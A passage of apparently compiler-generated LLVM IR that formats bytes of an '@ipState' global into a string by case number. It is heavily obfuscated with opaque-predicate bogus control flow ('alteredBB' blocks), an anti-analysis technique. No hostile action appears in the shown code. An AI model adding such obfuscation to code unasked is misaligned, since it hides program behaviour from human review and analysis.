  %1106 = zext i8 %1105 to i32
  %1107 = call i32 (i8*, i8*, ...) @szprintf(i8* %1102, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.94, i32 0, i32 0), i32 %1104, i32 %1106)
  %1108 = load i32, i32* @x.75
  %1109 = load i32, i32* @y.76
  %1110 = sub i32 %1108, 1
  %1111 = mul i32 %1108, %1110
  %1112 = urem i32 %1111, 2
  %1113 = icmp eq i32 %1112, 0
  %1114 = icmp slt i32 %1109, 10
  %1115 = or i1 %1113, %1114
  br i1 %1115, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1116

; <label>:1116:                                   ; preds = %originalBBpart2136, %1090
  %1117 = load i32, i32* %1, align 4
  %1118 = icmp eq i32 %1117, 53
  br i1 %1118, label %1119, label %1142

; <label>:1119:                                   ; preds = %1116
  %1120 = load i32, i32* @x.75
  %1121 = load i32, i32* @y.76
  %1122 = sub i32 %1120, 1
  %1123 = mul i32 %1120, %1122
  %1124 = urem i32 %1123, 2
  %1125 = icmp eq i32 %1124, 0
  %1126 = icmp slt i32 %1121, 10
  %1127 = or i1 %1125, %1126
  br i1 %1127, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1119
  %1128 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1130 = zext i8 %1129 to i32
  %1131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1132 = zext i8 %1131 to i32
  %1133 = call i32 (i8*, i8*, ...) @szprintf(i8* %1128, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.95, i32 0, i32 0), i32 %1130, i32 %1132)
  %1134 = load i32, i32* @x.75
  %1135 = load i32, i32* @y.76
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1142

; <label>:1142:                                   ; preds = %originalBBpart2140, %1116
  %1143 = load i32, i32* %1, align 4
  %1144 = icmp eq i32 %1143, 54
  br i1 %1144, label %1145, label %1152

; <label>:1145:                                   ; preds = %1142
  %1146 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1147 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1148 = zext i8 %1147 to i32
  %1149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1150 = zext i8 %1149 to i32
  %1151 = call i32 (i8*, i8*, ...) @szprintf(i8* %1146, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.96, i32 0, i32 0), i32 %1148, i32 %1150)
  br label %1152

; <label>:1152:                                   ; preds = %1145, %1142
  %1153 = load i32, i32* @x.75
  %1154 = load i32, i32* @y.76
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1152
  %1161 = load i32, i32* %1, align 4
  %1162 = icmp eq i32 %1161, 55
  %1163 = load i32, i32* @x.75
  %1164 = load i32, i32* @y.76
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1162, label %1171, label %1194

; <label>:1171:                                   ; preds = %originalBBpart2144
  %1172 = load i32, i32* @x.75
  %1173 = load i32, i32* @y.76
  %1174 = sub i32 %1172, 1
  %1175 = mul i32 %1172, %1174
  %1176 = urem i32 %1175, 2
  %1177 = icmp eq i32 %1176, 0
  %1178 = icmp slt i32 %1173, 10
  %1179 = or i1 %1177, %1178
  br i1 %1179, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1171
  %1180 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1182 = zext i8 %1181 to i32
  %1183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1184 = zext i8 %1183 to i32
  %1185 = call i32 (i8*, i8*, ...) @szprintf(i8* %1180, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.97, i32 0, i32 0), i32 %1182, i32 %1184)
  %1186 = load i32, i32* @x.75
  %1187 = load i32, i32* @y.76
  %1188 = sub i32 %1186, 1
  %1189 = mul i32 %1186, %1188
  %1190 = urem i32 %1189, 2
  %1191 = icmp eq i32 %1190, 0
  %1192 = icmp slt i32 %1187, 10
  %1193 = or i1 %1191, %1192
  br i1 %1193, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1194

; <label>:1194:                                   ; preds = %originalBBpart2148, %originalBBpart2144
  %1195 = load i32, i32* @x.75
  %1196 = load i32, i32* @y.76
  %1197 = sub i32 %1195, 1
  %1198 = mul i32 %1195, %1197
  %1199 = urem i32 %1198, 2
  %1200 = icmp eq i32 %1199, 0
  %1201 = icmp slt i32 %1196, 10
  %1202 = or i1 %1200, %1201
  br i1 %1202, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1194
  %1203 = load i32, i32* %1, align 4
  %1204 = icmp eq i32 %1203, 56
  %1205 = load i32, i32* @x.75
  %1206 = load i32, i32* @y.76
  %1207 = sub i32 %1205, 1
  %1208 = mul i32 %1205, %1207
  %1209 = urem i32 %1208, 2
  %1210 = icmp eq i32 %1209, 0
  %1211 = icmp slt i32 %1206, 10
  %1212 = or i1 %1210, %1211
  br i1 %1212, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1204, label %1213, label %1220

; <label>:1213:                                   ; preds = %originalBBpart2152
  %1214 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1215 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1218 = zext i8 %1217 to i32
  %1219 = call i32 (i8*, i8*, ...) @szprintf(i8* %1214, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.98, i32 0, i32 0), i32 %1216, i32 %1218)
  br label %1220

; <label>:1220:                                   ; preds = %1213, %originalBBpart2152
  %1221 = load i32, i32* %1, align 4
  %1222 = icmp eq i32 %1221, 57
  br i1 %1222, label %1223, label %1246

; <label>:1223:                                   ; preds = %1220
  %1224 = load i32, i32* @x.75
  %1225 = load i32, i32* @y.76
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1223
  %1232 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1234 = zext i8 %1233 to i32
  %1235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = call i32 (i8*, i8*, ...) @szprintf(i8* %1232, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.99, i32 0, i32 0), i32 %1234, i32 %1236)
  %1238 = load i32, i32* @x.75
  %1239 = load i32, i32* @y.76
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1246

; <label>:1246:                                   ; preds = %originalBBpart2156, %1220
  %1247 = load i32, i32* @x.75
  %1248 = load i32, i32* @y.76
  %1249 = sub i32 %1247, 1
  %1250 = mul i32 %1247, %1249
  %1251 = urem i32 %1250, 2
  %1252 = icmp eq i32 %1251, 0
  %1253 = icmp slt i32 %1248, 10
  %1254 = or i1 %1252, %1253
  br i1 %1254, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1246
  %1255 = load i32, i32* %1, align 4
  %1256 = icmp eq i32 %1255, 58
  %1257 = load i32, i32* @x.75
  %1258 = load i32, i32* @y.76
  %1259 = sub i32 %1257, 1
  %1260 = mul i32 %1257, %1259
  %1261 = urem i32 %1260, 2
  %1262 = icmp eq i32 %1261, 0
  %1263 = icmp slt i32 %1258, 10
  %1264 = or i1 %1262, %1263
  br i1 %1264, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1256, label %1265, label %1272

; <label>:1265:                                   ; preds = %originalBBpart2160
  %1266 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1270 = zext i8 %1269 to i32
  %1271 = call i32 (i8*, i8*, ...) @szprintf(i8* %1266, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.100, i32 0, i32 0), i32 %1268, i32 %1270)
  br label %1272

; <label>:1272:                                   ; preds = %1265, %originalBBpart2160
  %1273 = load i32, i32* @x.75
  %1274 = load i32, i32* @y.76
  %1275 = sub i32 %1273, 1
  %1276 = mul i32 %1273, %1275
  %1277 = urem i32 %1276, 2
  %1278 = icmp eq i32 %1277, 0
  %1279 = icmp slt i32 %1274, 10
  %1280 = or i1 %1278, %1279
  br i1 %1280, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1272
  %1281 = load i32, i32* %1, align 4
  %1282 = icmp eq i32 %1281, 59
  %1283 = load i32, i32* @x.75
  %1284 = load i32, i32* @y.76
  %1285 = sub i32 %1283, 1
  %1286 = mul i32 %1283, %1285
  %1287 = urem i32 %1286, 2
  %1288 = icmp eq i32 %1287, 0
  %1289 = icmp slt i32 %1284, 10
  %1290 = or i1 %1288, %1289
  br i1 %1290, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1282, label %1291, label %1298

; <label>:1291:                                   ; preds = %originalBBpart2164
  %1292 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1294 = zext i8 %1293 to i32
  %1295 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = call i32 (i8*, i8*, ...) @szprintf(i8* %1292, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.101, i32 0, i32 0), i32 %1294, i32 %1296)
  br label %1298

; <label>:1298:                                   ; preds = %1291, %originalBBpart2164
  %1299 = load i32, i32* @x.75
  %1300 = load i32, i32* @y.76
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1298
  %1307 = load i32, i32* %1, align 4
  %1308 = icmp eq i32 %1307, 60
  %1309 = load i32, i32* @x.75
  %1310 = load i32, i32* @y.76
  %1311 = sub i32 %1309, 1
  %1312 = mul i32 %1309, %1311
  %1313 = urem i32 %1312, 2
  %1314 = icmp eq i32 %1313, 0
  %1315 = icmp slt i32 %1310, 10
  %1316 = or i1 %1314, %1315
  br i1 %1316, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1308, label %1317, label %1324

; <label>:1317:                                   ; preds = %originalBBpart2168
  %1318 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1319 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1320 = zext i8 %1319 to i32
  %1321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1322 = zext i8 %1321 to i32
  %1323 = call i32 (i8*, i8*, ...) @szprintf(i8* %1318, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.102, i32 0, i32 0), i32 %1320, i32 %1322)
  br label %1324

; <label>:1324:                                   ; preds = %1317, %originalBBpart2168
  %1325 = load i32, i32* %1, align 4
  %1326 = icmp eq i32 %1325, 61
  br i1 %1326, label %1327, label %1334

; <label>:1327:                                   ; preds = %1324
  %1328 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1330 = zext i8 %1329 to i32
  %1331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1332 = zext i8 %1331 to i32
  %1333 = call i32 (i8*, i8*, ...) @szprintf(i8* %1328, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.103, i32 0, i32 0), i32 %1330, i32 %1332)
  br label %1334

; <label>:1334:                                   ; preds = %1327, %1324
  %1335 = load i32, i32* %1, align 4
  %1336 = icmp eq i32 %1335, 62
  br i1 %1336, label %1337, label %1344

; <label>:1337:                                   ; preds = %1334
  %1338 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1340 = zext i8 %1339 to i32
  %1341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1342 = zext i8 %1341 to i32
  %1343 = call i32 (i8*, i8*, ...) @szprintf(i8* %1338, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.104, i32 0, i32 0), i32 %1340, i32 %1342)
  br label %1344

; <label>:1344:                                   ; preds = %1337, %1334
  %1345 = load i32, i32* %1, align 4
  %1346 = icmp eq i32 %1345, 63
  br i1 %1346, label %1347, label %1354

; <label>:1347:                                   ; preds = %1344
  %1348 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1350 = zext i8 %1349 to i32
  %1351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1352 = zext i8 %1351 to i32
  %1353 = call i32 (i8*, i8*, ...) @szprintf(i8* %1348, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.105, i32 0, i32 0), i32 %1350, i32 %1352)
  br label %1354

; <label>:1354:                                   ; preds = %1347, %1344
  %1355 = load i32, i32* %1, align 4
  %1356 = icmp eq i32 %1355, 64
  br i1 %1356, label %1357, label %1364

; <label>:1357:                                   ; preds = %1354
  %1358 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1359 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1360 = zext i8 %1359 to i32
  %1361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1362 = zext i8 %1361 to i32
  %1363 = call i32 (i8*, i8*, ...) @szprintf(i8* %1358, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0), i32 %1360, i32 %1362)
  br label %1364

; <label>:1364:                                   ; preds = %1357, %1354
  %1365 = load i32, i32* %1, align 4
  %1366 = icmp eq i32 %1365, 65
  br i1 %1366, label %1367, label %1374

; <label>:1367:                                   ; preds = %1364
  %1368 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1370 = zext i8 %1369 to i32
  %1371 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1372 = zext i8 %1371 to i32
  %1373 = call i32 (i8*, i8*, ...) @szprintf(i8* %1368, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i32 %1370, i32 %1372)
  br label %1374

; <label>:1374:                                   ; preds = %1367, %1364
  %1375 = load i32, i32* @x.75
  %1376 = load i32, i32* @y.76
  %1377 = sub i32 %1375, 1
  %1378 = mul i32 %1375, %1377
  %1379 = urem i32 %1378, 2
  %1380 = icmp eq i32 %1379, 0
  %1381 = icmp slt i32 %1376, 10
  %1382 = or i1 %1380, %1381
  br i1 %1382, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1374
  %1383 = load i32, i32* %1, align 4
  %1384 = icmp eq i32 %1383, 66
  %1385 = load i32, i32* @x.75
  %1386 = load i32, i32* @y.76
  %1387 = sub i32 %1385, 1
  %1388 = mul i32 %1385, %1387
  %1389 = urem i32 %1388, 2
  %1390 = icmp eq i32 %1389, 0
  %1391 = icmp slt i32 %1386, 10
  %1392 = or i1 %1390, %1391
  br i1 %1392, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1384, label %1393, label %1400

; <label>:1393:                                   ; preds = %originalBBpart2172
  %1394 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1395 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1398 = zext i8 %1397 to i32
  %1399 = call i32 (i8*, i8*, ...) @szprintf(i8* %1394, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i32 %1396, i32 %1398)
  br label %1400

; <label>:1400:                                   ; preds = %1393, %originalBBpart2172
  %1401 = load i32, i32* @x.75
  %1402 = load i32, i32* @y.76
  %1403 = sub i32 %1401, 1
  %1404 = mul i32 %1401, %1403
  %1405 = urem i32 %1404, 2
  %1406 = icmp eq i32 %1405, 0
  %1407 = icmp slt i32 %1402, 10
  %1408 = or i1 %1406, %1407
  br i1 %1408, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1400
  %1409 = load i32, i32* %1, align 4
  %1410 = icmp eq i32 %1409, 67
  %1411 = load i32, i32* @x.75
  %1412 = load i32, i32* @y.76
  %1413 = sub i32 %1411, 1
  %1414 = mul i32 %1411, %1413
  %1415 = urem i32 %1414, 2
  %1416 = icmp eq i32 %1415, 0
  %1417 = icmp slt i32 %1412, 10
  %1418 = or i1 %1416, %1417
  br i1 %1418, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1410, label %1419, label %1442

; <label>:1419:                                   ; preds = %originalBBpart2176
  %1420 = load i32, i32* @x.75
  %1421 = load i32, i32* @y.76
  %1422 = sub i32 %1420, 1
  %1423 = mul i32 %1420, %1422
  %1424 = urem i32 %1423, 2
  %1425 = icmp eq i32 %1424, 0
  %1426 = icmp slt i32 %1421, 10
  %1427 = or i1 %1425, %1426
  br i1 %1427, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1419
  %1428 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1430 = zext i8 %1429 to i32
  %1431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1432 = zext i8 %1431 to i32
  %1433 = call i32 (i8*, i8*, ...) @szprintf(i8* %1428, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.109, i32 0, i32 0), i32 %1430, i32 %1432)
  %1434 = load i32, i32* @x.75
  %1435 = load i32, i32* @y.76
  %1436 = sub i32 %1434, 1
  %1437 = mul i32 %1434, %1436
  %1438 = urem i32 %1437, 2
  %1439 = icmp eq i32 %1438, 0
  %1440 = icmp slt i32 %1435, 10
  %1441 = or i1 %1439, %1440
  br i1 %1441, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1442

; <label>:1442:                                   ; preds = %originalBBpart2180, %originalBBpart2176
  %1443 = load i32, i32* %1, align 4
  %1444 = icmp eq i32 %1443, 68
  br i1 %1444, label %1445, label %1452

; <label>:1445:                                   ; preds = %1442
  %1446 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1447 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1448 = zext i8 %1447 to i32
  %1449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1450 = zext i8 %1449 to i32
  %1451 = call i32 (i8*, i8*, ...) @szprintf(i8* %1446, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.110, i32 0, i32 0), i32 %1448, i32 %1450)
  br label %1452

; <label>:1452:                                   ; preds = %1445, %1442
  %1453 = load i32, i32* %1, align 4
  %1454 = icmp eq i32 %1453, 69
  br i1 %1454, label %1455, label %1462

; <label>:1455:                                   ; preds = %1452
  %1456 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1458 = zext i8 %1457 to i32
  %1459 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1460 = zext i8 %1459 to i32
  %1461 = call i32 (i8*, i8*, ...) @szprintf(i8* %1456, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.111, i32 0, i32 0), i32 %1458, i32 %1460)
  br label %1462

; <label>:1462:                                   ; preds = %1455, %1452
  %1463 = load i32, i32* %1, align 4
  %1464 = icmp eq i32 %1463, 70
  br i1 %1464, label %1465, label %1472

; <label>:1465:                                   ; preds = %1462
  %1466 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1467 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1468 = zext i8 %1467 to i32
  %1469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1470 = zext i8 %1469 to i32
  %1471 = call i32 (i8*, i8*, ...) @szprintf(i8* %1466, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.112, i32 0, i32 0), i32 %1468, i32 %1470)
  br label %1472

; <label>:1472:                                   ; preds = %1465, %1462
  %1473 = load i32, i32* %1, align 4
  %1474 = icmp eq i32 %1473, 71
  br i1 %1474, label %1475, label %1482

; <label>:1475:                                   ; preds = %1472
  %1476 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1478 = zext i8 %1477 to i32
  %1479 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1480 = zext i8 %1479 to i32
  %1481 = call i32 (i8*, i8*, ...) @szprintf(i8* %1476, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %1478, i32 %1480)
  br label %1482

; <label>:1482:                                   ; preds = %1475, %1472
  %1483 = load i32, i32* %1, align 4
  %1484 = icmp eq i32 %1483, 72
  br i1 %1484, label %1485, label %1508

; <label>:1485:                                   ; preds = %1482
  %1486 = load i32, i32* @x.75
  %1487 = load i32, i32* @y.76
  %1488 = sub i32 %1486, 1
  %1489 = mul i32 %1486, %1488
  %1490 = urem i32 %1489, 2
  %1491 = icmp eq i32 %1490, 0
  %1492 = icmp slt i32 %1487, 10
  %1493 = or i1 %1491, %1492
  br i1 %1493, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1485
  %1494 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1495 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1496 = zext i8 %1495 to i32
  %1497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1498 = zext i8 %1497 to i32
  %1499 = call i32 (i8*, i8*, ...) @szprintf(i8* %1494, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i32 %1496, i32 %1498)
  %1500 = load i32, i32* @x.75
  %1501 = load i32, i32* @y.76
  %1502 = sub i32 %1500, 1
  %1503 = mul i32 %1500, %1502
  %1504 = urem i32 %1503, 2
  %1505 = icmp eq i32 %1504, 0
  %1506 = icmp slt i32 %1501, 10
  %1507 = or i1 %1505, %1506
  br i1 %1507, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1508

; <label>:1508:                                   ; preds = %originalBBpart2184, %1482
  %1509 = load i32, i32* @x.75
  %1510 = load i32, i32* @y.76
  %1511 = sub i32 %1509, 1
  %1512 = mul i32 %1509, %1511
  %1513 = urem i32 %1512, 2
  %1514 = icmp eq i32 %1513, 0
  %1515 = icmp slt i32 %1510, 10
  %1516 = or i1 %1514, %1515
  br i1 %1516, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1508
  %1517 = load i32, i32* %1, align 4
  %1518 = icmp eq i32 %1517, 73
  %1519 = load i32, i32* @x.75
  %1520 = load i32, i32* @y.76
  %1521 = sub i32 %1519, 1
  %1522 = mul i32 %1519, %1521
  %1523 = urem i32 %1522, 2
  %1524 = icmp eq i32 %1523, 0
  %1525 = icmp slt i32 %1520, 10
  %1526 = or i1 %1524, %1525
  br i1 %1526, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br i1 %1518, label %1527, label %1550

; <label>:1527:                                   ; preds = %originalBBpart2188
  %1528 = load i32, i32* @x.75
  %1529 = load i32, i32* @y.76
  %1530 = sub i32 %1528, 1
  %1531 = mul i32 %1528, %1530
  %1532 = urem i32 %1531, 2
  %1533 = icmp eq i32 %1532, 0
  %1534 = icmp slt i32 %1529, 10
  %1535 = or i1 %1533, %1534
  br i1 %1535, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1527
  %1536 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1537 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1538 = zext i8 %1537 to i32
  %1539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1540 = zext i8 %1539 to i32
  %1541 = call i32 (i8*, i8*, ...) @szprintf(i8* %1536, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %1538, i32 %1540)
  %1542 = load i32, i32* @x.75
  %1543 = load i32, i32* @y.76
  %1544 = sub i32 %1542, 1
  %1545 = mul i32 %1542, %1544
  %1546 = urem i32 %1545, 2
  %1547 = icmp eq i32 %1546, 0
  %1548 = icmp slt i32 %1543, 10
  %1549 = or i1 %1547, %1548
  br i1 %1549, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1550

; <label>:1550:                                   ; preds = %originalBBpart2192, %originalBBpart2188
  %1551 = load i32, i32* %1, align 4
  %1552 = icmp eq i32 %1551, 74
  br i1 %1552, label %1553, label %1576

; <label>:1553:                                   ; preds = %1550
  %1554 = load i32, i32* @x.75
  %1555 = load i32, i32* @y.76
  %1556 = sub i32 %1554, 1
  %1557 = mul i32 %1554, %1556
  %1558 = urem i32 %1557, 2
  %1559 = icmp eq i32 %1558, 0
  %1560 = icmp slt i32 %1555, 10
  %1561 = or i1 %1559, %1560
